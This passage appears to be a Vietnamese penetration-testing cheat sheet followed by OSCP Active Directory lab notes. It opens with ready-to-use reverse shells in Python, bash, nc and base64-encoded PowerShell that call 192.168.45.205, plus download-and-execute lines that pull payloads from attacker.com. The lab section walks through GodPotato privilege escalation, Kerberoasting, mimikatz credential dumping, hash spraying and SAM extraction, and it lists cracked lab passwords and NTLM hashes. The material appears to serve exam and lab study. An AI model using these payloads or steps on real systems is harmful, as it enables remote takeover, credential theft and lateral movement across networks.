python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.205",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

**Badchar remove - Dùng base64**
```bash
# encode payload
echo '/bin/bash -i >& /dev/tcp/192.168.45.205/4444 0>&1' | base64

# payload on target
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDA+JjE=' | base64 -d | bash
```

**Badchar remove - Dùng Fileless**
```bash
# tạo file payload.txt trên kali
echo '/bin/bash -i >& /dev/tcp/192.168.45.205/443 0>&1' > payload.txt

# host server on kali
python3 -m http.server 80

# payload on target
curl 192.168.45.205/payload.txt|bash
```

**SSH**
```bash
# Kiểm tra file /etc/ssh/sshd_config
# PermitRootLogin prohibit-password
# PermitRootLogin yes
# PubkeyAuthentication yes

# Tạo cặp khóa
ssh-keygen -t ed25519 -C "root-access-key"
# or
ssh-keygen -t rsa -b 1024 -f key_gen -N ""

# Cho khoá lên server
mkdir -p /root/.ssh
echo "<nội dung public key>" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh

# Kiểm tra lại cấu hình và restart
sshd -t
systemctl restart sshd

# Convert key sang dạng pem cũ
cp id_rsa id_rsa.bak
ssh-keygen -p -m PEM -f id_rsa -N ""
ssh -i id -o PubkeyAcceptedAlgorithms=+ssh-rsa user@host
```

**xfreerdp**
```bash
# xfreerdp với tk domain
xfreerdp /v:<target_ip> /u:<username> /d:<domain> /p:<password> /dynamic-resolution +clipboard /cert:ignore

# xfreerdp với tk thường
xfreerdp /v:<target_ip> /u:<username> /p:<password> /dynamic-resolution +clipboard /cert:ignore

# xfreerdp thêm mount home
xfreerdp /v:<target_ip> /u:<username> /d:<domain> /p:<password> /dynamic-resolution /cert:ignore +clipboard +home-drive
```

**evil-winrm**
```bash
# dùng password
evil-winrm -i <target-ip> -u <username> -p '<password>'

# dùng hash
evil-winrm -i <target-ip> -u <username> -H <NTHASH>

# kerberos
sudo ntpdate <dc-ip>
export KRB5CCNAME=/path/to/ticket.ccache
evil-winrm -i dc01.corp.local -u <username> -r <domain.local>
```

#### Windows

**Shell for CMD**
```bash
# Sử dụng nc
nc.exe 192.168.45.205 4444 -e cmd.exe

# Sử dụng powershell trên cmd
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('192.168.45.205', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
```

**Shell for Powershell - Badchar remove (base64)**
```powershell
powershell -e JABFAHIAcgBvAHIAVgBpAGUAdwA9ACIATgBvAHIAbQBhAGwAVgBpAGUAdwAiADsAJABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAQwBvAG4AdABpAG4AdQBlACIAOwAkAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA1ACIALAA0ADQANAA0ACkAOwAkAHMAPQAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpAD0AJABzAC4AUgBlAGEAZAAoACQAYgAsADAALAAkAGIALgBMAGUAbgBnAHQAaAApACkALQBuAGUAMAApAHsAJABkAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgAsADAALAAkAGkAKQA7AHQAcgB5AHsAJABvAD0AaQBlAHgAIAAkAGQAIAAyAD4AJgAxACAAMwA+ACYAMQAgADQAPgAmADEAIAA1AD4AJgAxACAANgA+ACYAMQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAfQBjAGEAdABjAGgAewAkAG8APQAkAF8AfABPAHUAdAAtAFMAdAByAGkAbgBnAH0AaQBmACgAWwBzAHQAcgBpAG4AZwBdADoAOgBJAHMATgB1AGwAbABPAHIARQBtAHAAdAB5ACgAJABvACkAKQB7ACQAbwA9ACIAIgB9ACQAcAA9ACIAUABTACAAIgArACgAcAB3AGQAKQAuAFAAYQB0AGgAKwAiAD4AIAAiADsAWwBiAHkAdABlAFsAXQBdACQAcwBiAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAG8AKwAkAHAAKQA7ACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiACwAMAAsACQAcwBiAC4ATABlAG4AZwB0AGgAKQA7ACQAcwAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwAuAEMAbABvAHMAZQAoACkA
```

**Shell for Powershell - Dùng fileless**
```powershell
# Tạo file shell.txt trên máy kali
$LHOST = "192.168.45.205"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()

# Tải File shell.txt về Server và thực thi - Nếu shell hiện tại là powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
IWR -Uri http://attacker.com/payload.ps1 -UseBasicParsing | IEX
certutil -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\tmp.exe
certutil -urlcache -f http://attacker.com/payload.b64 payload.b64
certutil -decode payload.b64 payload.exe

# Tải file và thực thi nếu shell là cmd
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
powershell -w hidden -ep bypass -c "irm http://attacker.com/payload.ps1 | iex"
certutil -urlcache -split -f http://attacker.com/payload.exe %TEMP%\p.exe
```

---

## Lession

### OSCP-AD Lab

#### 192.168.X.141 - MS01

**Windows Enum**
```bash
nmap 192.168.65.141 -p- -T4
# -> chỉ mở winrm
```

**Winrm login**
```bash
evil-winrm -i 192.168.65.141 -u Eric.Wallows -p EricLikesRunning800
```

**Tải winpeas.exe**
```powershell
cd /
mkdir temp
cd temp
# upload winPEASx64.exe
.\winPEASx64.exe quiet > winpeas.out
```

**Chạy whoami**
```powershell
whoami /all
# -> phát hiện SeImpersonatePrivilege
```

**Kiểm tra Print Spooler**
```powershell
Get-Service Spooler
# -> ok
```

**Leo quyền bằng impersonate**
- Tìm tài khoản khác có trong máy: Mary.Williams, celia.almeda, support, Administrator, web_svc

**Trên máy có thư mục nào lạ**
- `setup/clean.ps1` → xoá toàn bộ data → có thể lập lịch
- `setup/Autologon` → có thể có creds
- `wamp64/` → Kiểm tra file config, phpAdmin (password rỗng - chỉ chạy localhost)

**Service**
```powershell
# Đọc winpeas -> không có service nào
# phát hiện file:
cat C:\wamp64\www\Script\GPO.ps1
```

**Pivoting**
```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up

sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# Trên MS01
./agent.exe -connect 192.168.45.163:11601 -ignore-cert

# Trên Kali
» session
» start

sudo ip route add 10.10.237.0/24 dev ligolo
```

**AD Enum**
```bash
# domain oscp.exam, Tìm host dc
sudo proxychains -q nxc smb 10.10.23.0/24 -u 'Eric.Wallows' -p 'EricLikesRunning800'

# Chạy SharpHound
./SharpHound.exe --CollectionMethods All --Domain oscp.exam --LdapUsername Eric.Wallows --LdapPassword EricLikesRunning800 --DomainController 10.10.23.140
```

**Phân tích BloodHound**
- người dùng eric.wallows không có quyền gì
- máy MS01 không có gì
- Tài khoản Domain Admin và TomAdmin không có gì
- Máy DC01 cũng không có gì
- Có tài khoản `WEB_SVC@OSCP.EXAM` và `SQL_SVC@OSCP.EXAM` có kerberos roasting

**Privilege Escalation - Leo quyền bằng impersonate**
```powershell
# Thêm tài khoản admin
.\GodPotato-NET4.exe -cmd "cmd /c net localgroup Administrators eric.wallows /add"

.\GodPotato-NET4.exe -cmd "cmd /c net user adminuser Qaz12345 /add"
.\GodPotato-NET4.exe -cmd "cmd /c net localgroup Administrators adminuser /add"
```

**Kerberos roasting**
```bash
faketime "$(ntpdate -q 10.10.193.140 | cut -d ' ' -f 1,2)" \
impacket-GetUserSPNs oscp.exam/Eric.Wallows:EricLikesRunning800 -dc-ip 10.10.193.140 -request -outputfile kerberos1.hash

# Không đồng bộ được thời gian qua proxychains do không sử dụng udp với ntpdate
sudo hashcat -m 13100 kerberos1.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force

# -> kết quả: web_svc:Diamond1
```

**Looting / Persistent**
```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
netstat -an | findstr 3389
```

**Chạy mimikatz**
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# celia.almeda : e728ecbadfb02f51ce8eed753f3ff3fd : 7k8XHk3dMtmpnC7
# Mary.Williams : 9a3121977ee93af56ebd0ef4f527a35e
```

**Danh sách creds**
```
web_svc       : Diamond1
celia.almeda  : e728ecbadfb02f51ce8eed753f3ff3fd (NTLM) : 7k8XHk3dMtmpnC7
Mary.Williams : 9a3121977ee93af56ebd0ef4f527a35e (NTLM)
```

**Lateral movement**
```bash
# Lấy danh sách user
impacket-GetADUsers -all oscp.exam/Eric.Wallows:EricLikesRunning800 -dc-ip 10.10.193.140 | awk 'NR>5 {print $1}' > users.txt

# Spray hash celia.almeda
nxc smb 192.168.193.141 -u users.txt -H e728ecbadfb02f51ce8eed753f3ff3fd

# Spray để tìm admin hoặc host có thể remote
nxc smb 10.10.193.0/24 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
nxc mssql 10.10.193.0/24 -u web_svc -p Diamond1 --continue-on-success

# SMB spider
nxc smb 10.10.193.140,141,142 -u celia.almeda -p 7k8XHk3dMtmpnC7 --shares
nxc smb 10.10.193.140 -u celia.almeda -p 7k8XHk3dMtmpnC7 -M spider_plus
# -> phát hiện 10.10.193.140 có SYSVOL, USER

smbclient //10.10.193.140/SYSVOL -U 'oscp.exam\celia.almeda%7k8XHk3dMtmpnC7'
smbclient //10.10.193.140/Users -U 'oscp.exam\celia.almeda%7k8XHk3dMtmpnC7' -c "recurse ON; prompt OFF; mget *"

# Thử với winrm
nxc winrm 10.10.193.0/24 -u celia.almeda -p 7k8XHk3dMtmpnC7
# -> có thể truy cập vào ms02

# Thử với mssql
impacket-mssqlclient celia.almeda:7k8XHk3dMtmpnC7@10.10.193.142 -windows-auth
```

---

#### 10.10.X.142 - MS02

**Initial Access**
```bash
evil-winrm -i 10.10.193.142 -u celia.almeda -p 7k8XHk3dMtmpnC7
```

**Windows Enum**
```powershell
# phát hiện windows.old
copy SAM C:\tmp\SAM
copy SYSTEM C:\tmp\SYSTEM

# dump SAM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
# -> phát hiện tom_admin
# tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
```

---

#### 192.168.X.143

**Port Scanning**
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
81/tcp   open  hosts2-ns
443/tcp  open  https
3000/tcp open  ppp
3001/tcp open  nessus
3003/tcp open  cgms
3306/tcp open  mysql
5432/tcp open  postgresql
```

**FTP enum**
```
vsftpd 3.0.3
```

**HTTP enum**
```
# cổng 80
Apache/2.4.41
http://192.168.193.143/0 -> Pico 3.0.0-alpha.2

# cổng 81
nginx
```
